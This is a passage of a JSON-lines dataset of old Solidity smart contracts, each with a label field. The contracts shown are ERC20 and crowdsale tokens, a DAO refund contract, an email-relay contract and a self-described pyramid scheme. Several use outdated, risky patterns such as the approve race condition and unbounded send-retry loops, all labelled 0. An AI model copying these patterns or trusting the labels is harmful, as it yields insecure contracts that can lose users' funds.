public owner;\r\r\n\r\r\n    \/\/ Balances for each account\r\r\n    mapping(address => uint256) balances;\r\r\n\r\r\n    \/\/ Owner of account approves the transfer of an amount to another account\r\r\n    mapping(address => mapping (address => uint256)) allowed;\r\r\n\r\r\n    \/\/ Functions with this modifier can only be executed by the owner\r\r\n    modifier onlyOwner() {\r\r\n        if (msg.sender != owner) {\r\r\n            throw;\r\r\n        }\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    \/\/ Constructor\r\r\n    function IncentToken() {\r\r\n        owner = msg.sender;\r\r\n        balances[owner] = _totalSupply;\r\r\n    }\r\r\n\r\r\n    function totalSupply() constant returns (uint256 totalSupply) {\r\r\n        totalSupply = _totalSupply;\r\r\n    }\r\r\n\r\r\n    \/\/ What is the balance of a particular account?\r\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n        return balances[_owner];\r\r\n    }\r\r\n\r\r\n    \/\/ Transfer the balance from owner&#39;s account to another account\r\r\n    function transfer(address _to, uint256 _amount) returns (bool success) {\r\r\n        if (balances[msg.sender] >= _amount\r\r\n            && _amount > 0\r\r\n            && balances[_to] + _amount > balances[_to]) {\r\r\n            balances[msg.sender] -= _amount;\r\r\n            balances[_to] += _amount;\r\r\n            Transfer(msg.sender, _to, _amount);\r\r\n            return true;\r\r\n        } else {\r\r\n            return false;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/ Send _value amount of tokens from address _from to address _to\r\r\n    \/\/ The transferFrom method is used for a withdraw workflow, allowing contracts to send\r\r\n    \/\/ tokens on your behalf, for example to \"deposit\" to a contract address and\/or to charge\r\r\n    \/\/ fees in sub-currencies; the command should fail unless the _from account has\r\r\n    \/\/ deliberately authorized the sender of the message via some mechanism; we propose\r\r\n    \/\/ these standardized APIs for approval:\r\r\n    function transferFrom(\r\r\n        address _from,\r\r\n        address _to,\r\r\n        uint256 _amount\r\r\n) returns (bool success) {\r\r\n        if (balances[_from] >= _amount\r\r\n            && allowed[_from][msg.sender] >= _amount\r\r\n            && _amount > 0\r\r\n            && balances[_to] + _amount > balances[_to]) {\r\r\n            balances[_from] -= _amount;\r\r\n            allowed[_from][msg.sender] -= _amount;\r\r\n            balances[_to] += _amount;\r\r\n            Transfer(_from, _to, _amount);\r\r\n            return true;\r\r\n        } else {\r\r\n            return false;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/ Allow _spender to withdraw from your account, multiple times, up to the _value amount.\r\r\n    \/\/ If this function is called again it overwrites the current allowance with _value.\r\r\n    function approve(address _spender, uint256 _amount) returns (bool success) {\r\r\n        allowed[msg.sender][_spender] = _amount;\r\r\n        Approval(msg.sender, _spender, _amount);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n        return allowed[_owner][_spender];\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract WavesEthereumSwap is IncentToken {\r\r\n    event WavesTransfer(address indexed _from, string wavesAddress, uint256 amount);\r\r\n\r\r\n    function moveToWaves(string wavesAddress, uint256 amount) {\r\r\n        if (!transfer(owner, amount)) throw;\r\r\n        WavesTransfer(msg.sender, wavesAddress, amount);\r\r\n    }\r\r\n}","label":0}
{"code":"\/*\r\r\n * ERC20 interface\r\r\n * see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 {\r\r\n  uint public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint);\r\r\n  function allowance(address owner, address spender) constant returns (uint);\r\r\n\r\r\n  function transfer(address to, uint value) returns (bool ok);\r\r\n  function transferFrom(address from, address to, uint value) returns (bool ok);\r\r\n  function approve(address spender, uint value) returns (bool ok);\r\r\n  event Transfer(address indexed from, address indexed to, uint value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Math operations with safety checks\r\r\n *\/\r\r\ncontract SafeMath {\r\r\n  function safeMul(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeDiv(uint a, uint b) internal returns (uint) {\r\r\n    assert(b > 0);\r\r\n    uint c = a \/ b;\r\r\n    assert(a == b * c + a % b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function safeSub(uint a, uint b) internal returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function safeAdd(uint a, uint b) internal returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a && c>=b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a >= b ? a : b;\r\r\n  }\r\r\n\r\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    return a < b ? a : b;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) internal {\r\r\n    if (!assertion) {\r\r\n      throw;\r\r\n    }\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Standard ERC20 token with Short Hand Attack and approve() race condition mitigation.\r\r\n *\r\r\n * Based on code by FirstBlood:\r\r\n * https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, SafeMath {\r\r\n\r\r\n  \/* Token supply got increased and a new owner received these tokens *\/\r\r\n  event Minted(address receiver, uint amount);\r\r\n\r\r\n  \/* Actual balances of token holders *\/\r\r\n  mapping(address => uint) balances;\r\r\n\r\r\n  \/* approve() allowances *\/\r\r\n  mapping (address => mapping (address => uint)) allowed;\r\r\n\r\r\n  \/* Interface declaration *\/\r\r\n  function isToken() public constant returns (bool weAre) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) returns (bool success) {\r\r\n    balances[msg.sender] = safeSub(balances[msg.sender], _value);\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) returns (bool success) {\r\r\n    uint _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    balances[_to] = safeAdd(balances[_to], _value);\r\r\n    balances[_from] = safeSub(balances[_from], _value);\r\r\n    allowed[_from][msg.sender] = safeSub(_allowance, _value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function balanceOf(address _owner) constant returns (uint balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n  function approve(address _spender, uint _value) returns (bool success) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Upgrade agent interface inspired by Lunyr.\r\r\n *\r\r\n * Upgrade agent transfers tokens to a new contract.\r\r\n * Upgrade agent itself can be the token contract, or just a middle man contract doing the heavy lifting.\r\r\n *\/\r\r\ncontract UpgradeAgent {\r\r\n\r\r\n  uint public originalSupply;\r\r\n\r\r\n  \/** Interface marker *\/\r\r\n  function isUpgradeAgent() public constant returns (bool) {\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function upgradeFrom(address _from, uint256 _value) public;\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token upgrade mechanism where users can opt-in amount of tokens to the next smart contract revision.\r\r\n *\r\r\n * First envisioned by Golem and Lunyr projects.\r\r\n *\/\r\r\ncontract UpgradeableToken is StandardToken {\r\r\n\r\r\n  \/** Contract \/ person who can set the upgrade path. This can be the same as team multisig wallet, as what it is with its default value. *\/\r\r\n  address public upgradeMaster;\r\r\n\r\r\n  \/** The next contract where the tokens will be migrated. *\/\r\r\n  UpgradeAgent public upgradeAgent;\r\r\n\r\r\n  \/** How many tokens we have upgraded by now. *\/\r\r\n  uint256 public totalUpgraded;\r\r\n\r\r\n  \/**\r\r\n   * Upgrade states.\r\r\n   *\r\r\n   * - NotAllowed: The child contract has not reached a condition where the upgrade can bgun\r\r\n   * - WaitingForAgent: Token allows upgrade, but we don&#39;t have a new agent yet\r\r\n   * - ReadyToUpgrade: The agent is set, but not a single token has been upgraded yet\r\r\n   * - Upgrading: Upgrade agent is set and the balance holders can upgrade their tokens\r\r\n   *\r\r\n   *\/\r\r\n  enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\r\r\n\r\r\n  \/**\r\r\n   * Somebody has upgraded some of his tokens.\r\r\n   *\/\r\r\n  event Upgrade(address indexed _from, address indexed _to, uint256 _value);\r\r\n\r\r\n  \/**\r\r\n   * New upgrade agent available.\r\r\n   *\/\r\r\n  event UpgradeAgentSet(address agent);\r\r\n\r\r\n  \/**\r\r\n   * Do not allow construction without upgrade master set.\r\r\n   *\/\r\r\n  function UpgradeableToken(address _upgradeMaster) {\r\r\n    upgradeMaster = _upgradeMaster;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow the token holder to upgrade some of their tokens to a new contract.\r\r\n   *\/\r\r\n  function upgrade(uint256 value) public {\r\r\n\r\r\n      UpgradeState state = getUpgradeState();\r\r\n      if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\r\r\n        \/\/ Called in a bad state\r\r\n        throw;\r\r\n      }\r\r\n\r\r\n      \/\/ Validate input value.\r\r\n      if (value == 0) throw;\r\r\n\r\r\n      balances[msg.sender] = safeSub(balances[msg.sender], value);\r\r\n\r\r\n      \/\/ Take tokens out from circulation\r\r\n      totalSupply = safeSub(totalSupply, value);\r\r\n      totalUpgraded = safeAdd(totalUpgraded, value);\r\r\n\r\r\n      \/\/ Upgrade agent reissues the tokens\r\r\n      upgradeAgent.upgradeFrom(msg.sender, value);\r\r\n      Upgrade(msg.sender, upgradeAgent, value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set an upgrade agent that handles\r\r\n   *\/\r\r\n  function setUpgradeAgent(address agent) external {\r\r\n\r\r\n      if(!canUpgrade()) {\r\r\n        \/\/ The token is not yet in a state that we could think upgrading\r\r\n        throw;\r\r\n      }\r\r\n\r\r\n      if (agent == 0x0) throw;\r\r\n      \/\/ Only a master can designate the next agent\r\r\n      if (msg.sender != upgradeMaster) throw;\r\r\n      \/\/ Upgrade has already begun for an agent\r\r\n      if (getUpgradeState() == UpgradeState.Upgrading) throw;\r\r\n\r\r\n      upgradeAgent = UpgradeAgent(agent);\r\r\n\r\r\n      \/\/ Bad interface\r\r\n      if(!upgradeAgent.isUpgradeAgent()) throw;\r\r\n      \/\/ Make sure that token supplies match in source and target\r\r\n      if (upgradeAgent.originalSupply() != totalSupply) throw;\r\r\n\r\r\n      UpgradeAgentSet(upgradeAgent);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Get the state of the token upgrade.\r\r\n   *\/\r\r\n  function getUpgradeState() public constant returns(UpgradeState) {\r\r\n    if(!canUpgrade()) return UpgradeState.NotAllowed;\r\r\n    else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\r\r\n    else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\r\r\n    else return UpgradeState.Upgrading;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Change the upgrade master.\r\r\n   *\r\r\n   * This allows us to set a new owner for the upgrade mechanism.\r\r\n   *\/\r\r\n  function setUpgradeMaster(address master) public {\r\r\n      if (master == 0x0) throw;\r\r\n      if (msg.sender != upgradeMaster) throw;\r\r\n      upgradeMaster = master;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Child contract can enable to provide the condition when the upgrade can begun.\r\r\n   *\/\r\r\n  function canUpgrade() public constant returns(bool) {\r\r\n     return true;\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n * Ownable\r\r\n *\r\r\n * Base contract with an owner.\r\r\n * Provides onlyOwner modifier, which prevents function from running if it is called by anyone other than the owner.\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n  modifier onlyOwner() {\r\r\n    if (msg.sender != owner) {\r\r\n      throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Define interface for releasing the token transfer after a successful crowdsale.\r\r\n *\/\r\r\ncontract ReleasableToken is ERC20, Ownable {\r\r\n\r\r\n  \/* The finalizer contract that allows unlift the transfer limits on this token *\/\r\r\n  address public releaseAgent;\r\r\n\r\r\n  \/** A crowdsale contract can release us to the wild if ICO success. If false we are are in transfer lock up period.*\/\r\r\n  bool public released = false;\r\r\n\r\r\n  \/** Map of agents that are allowed to transfer tokens regardless of the lock down period. These are crowdsale contracts and possible the team multisig itself. *\/\r\r\n  mapping (address => bool) public transferAgents;\r\r\n\r\r\n  \/**\r\r\n   * Limit token transfer until the crowdsale is over.\r\r\n   *\r\r\n   *\/\r\r\n  modifier canTransfer(address _sender) {\r\r\n\r\r\n    if(!released) {\r\r\n        if(!transferAgents[_sender]) {\r\r\n            throw;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Set the contract that can call release and make the token transferable.\r\r\n   *\r\r\n   * Design choice. Allow reset the release agent to fix fat finger mistakes.\r\r\n   *\/\r\r\n  function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\r\r\n\r\r\n    \/\/ We don&#39;t do interface check here as we might want to a normal wallet address to act as a release agent\r\r\n    releaseAgent = addr;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can allow a particular address (a crowdsale contract) to transfer tokens despite the lock up period.\r\r\n   *\/\r\r\n  function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\r\r\n    transferAgents[addr] = state;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * One way function to release the tokens to the wild.\r\r\n   *\r\r\n   * Can be called only from the release agent that is the final ICO contract. It is only called if the crowdsale has been success (first milestone reached).\r\r\n   *\/\r\r\n  function releaseTokenTransfer() public onlyReleaseAgent {\r\r\n    released = true;\r\r\n  }\r\r\n\r\r\n  \/** The function can be called only before or after the tokens have been releasesd *\/\r\r\n  modifier inReleaseState(bool releaseState) {\r\r\n    if(releaseState != released) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/** The function can be called only by a whitelisted release agent. *\/\r\r\n  modifier onlyReleaseAgent() {\r\r\n    if(msg.sender != releaseAgent) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\r\r\n    \/\/ Call StandardToken.transfer()\r\r\n   return super.transfer(_to, _value);\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\r\r\n    \/\/ Call StandardToken.transferForm()\r\r\n    return super.transferFrom(_from, _to, _value);\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * Safe unsigned safe math.\r\r\n *\r\r\n * https:\/\/blog.aragon.one\/library-driven-development-in-solidity-2bebcaf88736#.750gwtwli\r\r\n *\r\r\n * Originally from https:\/\/raw.githubusercontent.com\/AragonOne\/zeppelin-solidity\/master\/contracts\/SafeMathLib.sol\r\r\n *\r\r\n * Maintained here until merged to mainline zeppelin-solidity.\r\r\n *\r\r\n *\/\r\r\nlibrary SafeMathLib {\r\r\n\r\r\n  function times(uint a, uint b) returns (uint) {\r\r\n    uint c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function minus(uint a, uint b) returns (uint) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function plus(uint a, uint b) returns (uint) {\r\r\n    uint c = a + b;\r\r\n    assert(c>=a);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function assert(bool assertion) private {\r\r\n    if (!assertion) throw;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * A token that can increase its supply by another contract.\r\r\n *\r\r\n * This allows uncapped crowdsale by dynamically increasing the supply when money pours in.\r\r\n * Only mint agents, contracts whitelisted by owner, can mint new tokens.\r\r\n *\r\r\n *\/\r\r\ncontract MintableToken is StandardToken, Ownable {\r\r\n\r\r\n  using SafeMathLib for uint;\r\r\n\r\r\n  bool public mintingFinished = false;\r\r\n\r\r\n  \/** List of agents that are allowed to create new tokens *\/\r\r\n  mapping (address => bool) public mintAgents;\r\r\n\r\r\n  event MintingAgentChanged(address addr, bool state  );\r\r\n\r\r\n  \/**\r\r\n   * Create new tokens and allocate them to an address..\r\r\n   *\r\r\n   * Only callably by a crowdsale contract (mint agent).\r\r\n   *\/\r\r\n  function mint(address receiver, uint amount) onlyMintAgent canMint public {\r\r\n    totalSupply = totalSupply.plus(amount);\r\r\n    balances[receiver] = balances[receiver].plus(amount);\r\r\n\r\r\n    \/\/ This will make the mint transaction apper in EtherScan.io\r\r\n    \/\/ We can remove this after there is a standardized minting event\r\r\n    Transfer(0, receiver, amount);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can allow a crowdsale contract to mint new tokens.\r\r\n   *\/\r\r\n  function setMintAgent(address addr, bool state) onlyOwner canMint public {\r\r\n    mintAgents[addr] = state;\r\r\n    MintingAgentChanged(addr, state);\r\r\n  }\r\r\n\r\r\n  modifier onlyMintAgent() {\r\r\n    \/\/ Only crowdsale contracts are allowed to mint new tokens\r\r\n    if(!mintAgents[msg.sender]) {\r\r\n        throw;\r\r\n    }\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/** Make sure we are not done yet. *\/\r\r\n  modifier canMint() {\r\r\n    if(mintingFinished) throw;\r\r\n    _;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * A crowdsaled token.\r\r\n *\r\r\n * An ERC-20 token designed specifically for crowdsales with investor protection and further development path.\r\r\n *\r\r\n * - The token transfer() is disabled until the crowdsale is over\r\r\n * - The token contract gives an opt-in upgrade path to a new contract\r\r\n * - The same token can be part of several crowdsales through approve() mechanism\r\r\n * - The token can be capped (supply set in the constructor) or uncapped (crowdsale contract can mint new tokens)\r\r\n *\r\r\n *\/\r\r\ncontract CrowdsaleToken is ReleasableToken, MintableToken, UpgradeableToken {\r\r\n\r\r\n  \/** Name and symbol were updated. *\/\r\r\n  event UpdatedTokenInformation(string newName, string newSymbol);\r\r\n\r\r\n  string public name;\r\r\n\r\r\n  string public symbol;\r\r\n\r\r\n  uint public decimals;\r\r\n\r\r\n  \/**\r\r\n   * Construct the token.\r\r\n   *\r\r\n   * This token must be created through a team multisig wallet, so that it is owned by that wallet.\r\r\n   *\r\r\n   * @param _name Token name\r\r\n   * @param _symbol Token symbol - should be all caps\r\r\n   * @param _initialSupply How many tokens we start with\r\r\n   * @param _decimals Number of decimal places\r\r\n   * @param _mintable Are new tokens created over the crowdsale or do we distribute only the initial supply? Note that when the token becomes transferable the minting always ends.\r\r\n   *\/\r\r\n  function CrowdsaleToken(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable)\r\r\n    UpgradeableToken(msg.sender) {\r\r\n\r\r\n    \/\/ Create any address, can be transferred\r\r\n    \/\/ to team multisig via changeOwner(),\r\r\n    \/\/ also remember to call setUpgradeMaster()\r\r\n    owner = msg.sender;\r\r\n\r\r\n    name = _name;\r\r\n    symbol = _symbol;\r\r\n\r\r\n    totalSupply = _initialSupply;\r\r\n\r\r\n    decimals = _decimals;\r\r\n\r\r\n    \/\/ Create initially all balance on the team multisig\r\r\n    balances[owner] = totalSupply;\r\r\n\r\r\n    if(totalSupply > 0) {\r\r\n      Minted(owner, totalSupply);\r\r\n    }\r\r\n\r\r\n    \/\/ No more new supply allowed after the token creation\r\r\n    if(!_mintable) {\r\r\n      mintingFinished = true;\r\r\n      if(totalSupply == 0) {\r\r\n        throw; \/\/ Cannot create a token without supply and no minting\r\r\n      }\r\r\n    }\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * When token is released to be transferable, enforce no new tokens can be created.\r\r\n   *\/\r\r\n  function releaseTokenTransfer() public onlyReleaseAgent {\r\r\n    mintingFinished = true;\r\r\n    super.releaseTokenTransfer();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Allow upgrade agent functionality kick in only if the crowdsale was success.\r\r\n   *\/\r\r\n  function canUpgrade() public constant returns(bool) {\r\r\n    return released && super.canUpgrade();\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Owner can update token information here.\r\r\n   *\r\r\n   * It is often useful to conceal the actual token association, until\r\r\n   * the token operations, like central issuance or reissuance have been completed.\r\r\n   *\r\r\n   * This function allows the token owner to rename the token after the operations\r\r\n   * have been completed and then point the audience to use the token contract.\r\r\n   *\/\r\r\n  function setTokenInformation(string _name, string _symbol) onlyOwner {\r\r\n    name = _name;\r\r\n    symbol = _symbol;\r\r\n\r\r\n    UpdatedTokenInformation(name, symbol);\r\r\n  }\r\r\n\r\r\n}","label":0}
{"code":"\/\/ Refund contract for trust DAO #39\r\r\n\r\r\ncontract DAO {\r\r\n    function balanceOf(address addr) returns (uint);\r\r\n    function transferFrom(address from, address to, uint balance) returns (bool);\r\r\n    uint public totalSupply;\r\r\n}\r\r\n\r\r\ncontract WithdrawDAO {\r\r\n    DAO constant public mainDAO = DAO(0x6131c42fa982e56929107413a9d526fd99405560);\r\r\n    address public trustee = 0xf4c0eef475ab35625ac223394f9c410ccb577747;\r\r\n\r\r\n    function withdraw(){\r\r\n        uint balance = mainDAO.balanceOf(msg.sender);\r\r\n\r\r\n        if (!mainDAO.transferFrom(msg.sender, this, balance) || !msg.sender.send(balance))\r\r\n            throw;\r\r\n    }\r\r\n\r\r\n    function trusteeWithdraw() {\r\r\n        trustee.send((this.balance + mainDAO.balanceOf(this)) - mainDAO.totalSupply());\r\r\n    }\r\r\n}","label":0}
{"code":"\/* This contract is the API for blockchain2email.com, \r\r\n   which allows you to send emails from your smart contract.\r\r\n   Check out http:\/\/blockchain2email.com\/ fpr info on how to\r\r\n   include API reference into your contract.\r\r\n   \r\r\n   Version 1.1      *\/\r\r\n   \r\r\n\r\r\ncontract depletable {\r\r\n    address owner;\r\r\n    function depletable() { \r\r\n        owner = msg.sender;\r\r\n    }\r\r\n    function withdraw() { \r\r\n        if (msg.sender == owner) {\r\r\n            while(!owner.send(this.balance)){}\r\r\n        }\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract blockchain2email is depletable {\r\r\n\tevent EmailSent(address Sender, string EmailAddress, string Message);\r\r\n\t\r\r\n\tfunction SendEmail(string EmailAddress, string Message) returns (bool) { \r\r\n\t\tif(msg.value>999999999999999){\r\r\n\t\t\tEmailSent(msg.sender, EmailAddress, Message);\r\r\n\t\t\treturn (true);\r\r\n\t\t}else{\r\r\n\t\t    while(!msg.sender.send(msg.value)){}\r\r\n\t\t    return (false);\r\r\n\t\t}\r\r\n    } \r\r\n}","label":0}
{"code":"\/**\r\r\n\r\r\n *Submitted for verification at Etherscan.io on 2018-02-02\r\r\n\r\r\n*\/\r\r\n\r\r\n\r\r\n\r\r\npragma solidity ^0.4.18;\r\r\n\r\r\n\r\r\n\r\r\n\/*\r\r\n\r\r\n          ,\/`.\r\r\n\r\r\n        ,'\/ __`.\r\r\n\r\r\n      ,'_\/_  _ _`.\r\r\n\r\r\n    ,'__\/_ ___ _  `.\r\r\n\r\r\n  ,'_  \/___ __ _ __ `.\r\r\n\r\r\n '-.._\/___...-\"-.-..__`.\r\r\n\r\r\n  B\r\r\n\r\r\n\r\r\n\r\r\n EthPyramid. A no-bullshit, transparent, self-sustaining pyramid scheme.\r\r\n\r\r\n \r\r\n\r\r\n Inspired by https:\/\/test.jochen-hoenicke.de\/eth\/ponzitoken\/\r\r\n\r\r\n\r\r\n\r\r\n Developers:\r\r\n\r\r\n\tArc\r\r\n\r\r\n\tDivine\r\r\n\r\r\n\tNorsefire\r\r\n\r\r\n\tToCsIcK\r\r\n\r\r\n\t\r\r\n\r\r\n Front-End:\r\r\n\r\r\n\tCardioth\r\r\n\r\r\n\ttenmei\r\r\n\r\r\n\tTrendium\r\r\n\r\r\n\t\r\r\n\r\r\n Moral Support:\r\r\n\r\r\n\tDeadCow.Rat\r\r\n\r\r\n\tDots\r\r\n\r\r\n\tFatKreamy\r\r\n\r\r\n\tKaseylol\r\r\n\r\r\n\tQuantumDeath666\r\r\n\r\r\n\tQuentin\r\r\n\r\r\n \r\r\n\r\r\n Shit-Tier:\r\r\n\r\r\n\tHentaiChrist\r\r\n\r\r\n \r\r\n\r\r\n*\/\r\r\n\r\r\n\r\r\n\r\r\ncontract EthPyramid {\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ scaleFactor is used to convert Ether into tokens and vice-versa: they're of different\r\r\n\r\r\n\t\/\/ orders of magnitude, hence the need to bridge between the two.\r\r\n\r\r\n\tuint256 constant scaleFactor = 0x10000000000000000;  \/\/ 2^64\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ CRR = 50%\r\r\n\r\r\n\t\/\/ CRR is Cash Reserve Ratio (in this case Crypto Reserve Ratio).\r\r\n\r\r\n\t\/\/ For more on this: check out https:\/\/en.wikipedia.org\/wiki\/Reserve_requirement\r\r\n\r\r\n\tint constant crr_n = 1; \/\/ CRR numerator\r\r\n\r\r\n\tint constant crr_d = 2; \/\/ CRR denominator\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ The price coefficient. Chosen such that at 1 token total supply\r\r\n\r\r\n\t\/\/ the amount in reserve is 0.5 ether and token price is 1 Ether.\r\r\n\r\r\n\tint constant price_coeff = -0x296ABF784A358468C;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Typical values that we have to declare.\r\r\n\r\r\n\tstring constant public name = \"EthPyramid\";\r\r\n\r\r\n\tstring constant public symbol = \"EPY\";\r\r\n\r\r\n\tuint8 constant public decimals = 18;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Array between each address and their number of tokens.\r\r\n\r\r\n\tmapping(address => uint256) public tokenBalance;\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\/\/ Array between each address and how much Ether has been paid out to it.\r\r\n\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\r\r\n\tmapping(address => int256) public payouts;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Variable tracking how many tokens are in existence overall.\r\r\n\r\r\n\tuint256 public totalSupply;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Aggregate sum of all payouts.\r\r\n\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\r\r\n\tint256 totalPayouts;\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Variable tracking how much Ether each token is currently worth.\r\r\n\r\r\n\t\/\/ Note that this is scaled by the scaleFactor variable.\r\r\n\r\r\n\tuint256 earningsPerToken;\r\r\n\r\r\n\t\r\r\n\r\r\n\t\/\/ Current contract balance in Ether\r\r\n\r\r\n\tuint256 public contractBalance;\r\r\n\r\r\n\r\r\n\r\r\n\tfunction EthPyramid() public {}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ The following functions are used by the front-end for display purposes.\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Returns the number of tokens currently held by _owner.\r\r\n\r\r\n\tfunction balanceOf(address _owner) public constant returns (uint256 balance) {\r\r\n\r\r\n\t\treturn tokenBalance[_owner];\r\r\n\r\r\n\t}\r\r\n\r\r\n\r\r\n\r\r\n\t\/\/ Withdraws all dividends held by the caller sending the transaction, updates\r\r\n\r\r\n\t\/\/ the requisite global variables, and transfers Ether back to the caller.\r\r\n\r\r\n\tfunction withdraw() public {\r\r\n\r\r\n\t\t\/\/ Retrieve the dividends associated with the address the request came from.\r\r\n\r\r\n\t\tvar balance = dividends(msg.sender);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Update the payouts array, incrementing the request address by `balance`.\r\r\n\r\r\n\t\tpayouts[msg.sender] += (int256) (balance * scaleFactor);\r\r\n\r\r\n\t\t\r\r\n\r\r\n\t\t\/\/ Increase the total amount that's been paid out to maintain invariance.\r\r\n\r\r\n\t\ttotalPayouts += (int256) 